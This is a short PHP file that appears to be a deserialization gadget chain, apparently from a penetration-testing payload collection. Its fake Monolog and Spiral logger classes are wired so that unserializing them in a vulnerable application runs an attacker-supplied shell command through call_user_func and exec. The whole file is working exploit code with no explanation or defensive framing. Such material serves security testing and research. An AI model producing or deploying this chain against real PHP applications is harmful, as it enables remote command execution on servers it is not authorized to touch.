<?php

namespace Monolog\Handler
{
    class FingersCrossedHandler
    {
        protected $passthruLevel = 0;
        protected $buffer;
        protected $handler;

        function __construct($command)
        {
            $this->buffer = [['level'=>101,'level_name'=>$command,'context'=>[]]];
            $this->handler = new PsrHandler();
        }
    }

    class PsrHandler
    {
        protected $formatter;
        protected $logger;

        function __construct()
        {
            $this->formatter = new \Monolog\Formatter\NormalizerFormatter();
            $this->logger = new \Spiral\Logger\NullLogger();
        }
    }
}

namespace Monolog\Formatter
{
    class NormalizerFormatter
    {
        protected $maxNormalizeDepth = -1;

        function __construct()
        {
        }
    }
}

namespace Spiral\Logger
{
    class NullLogger
    {
        private $receptor;
        private $channel;

        function __construct()
        {
            $this->receptor = 'call_user_func';
            $this->channel = 'exec';
        }
    }
}